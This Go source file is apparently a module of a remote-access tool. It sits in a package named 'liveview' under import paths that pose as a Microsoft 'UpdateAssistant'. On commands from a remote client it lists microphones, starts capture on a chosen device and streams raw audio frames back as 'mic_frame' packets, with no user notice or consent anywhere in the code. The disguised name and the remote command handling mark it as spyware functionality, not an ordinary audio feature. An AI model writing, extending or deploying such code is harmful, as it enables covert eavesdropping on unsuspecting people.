//go:build windows

package liveview

import (
	"encoding/json"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/logger"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
	"github.com/microsoft/UpdateAssistant/modules/transport"
)

type outPkt struct {
	msgType string
	data    []byte
	pooled  *[]byte
}

var micOn bool

func startMicPoll(outbound chan outPkt, stopCh <-chan struct{}) {
	buf := make([]int16, 4096)
	ticker := time.NewTicker(30 * time.Millisecond)
	defer ticker.Stop()
	for {
		select {
		case <-stopCh:
			return
		case <-ticker.C:
			mu.Lock()
			on := micOn
			mu.Unlock()
			if !on {
				continue
			}
			n := sysutil.MicPoll(buf)
			if n > 0 {
				pcm := make([]byte, n*2)
				for i := 0; i < n; i++ {
					pcm[i*2] = byte(buf[i])
					pcm[i*2+1] = byte(buf[i] >> 8)
				}
				select {
				case outbound <- outPkt{msgType: "mic_frame", data: pcm}:
				default:
				}
			}
		}
	}
}

func HandleMic(client *transport.Client, msgType string, payload json.RawMessage) {
	switch msgType {
	case "mic_start":
		var p struct {
			DeviceID int `json:"device_id"`
		}
		if json.Unmarshal(payload, &p) == nil {
			if sysutil.MicStart(p.DeviceID) {
				mu.Lock()
				micOn = true
				mu.Unlock()
			}
		}
	case "mic_stop":
		mu.Lock()
		micOn = false
		mu.Unlock()
		sysutil.MicStop()
	case "mic_list":
		devices := sysutil.MicList()
		logger.Info("[lv] mic_list returning %d devices", len(devices))
		client.Send("mic_devices", devices)
	}
}

func StopMic() {
	mu.Lock()
	micOn = false
	mu.Unlock()
	sysutil.MicStop()
}
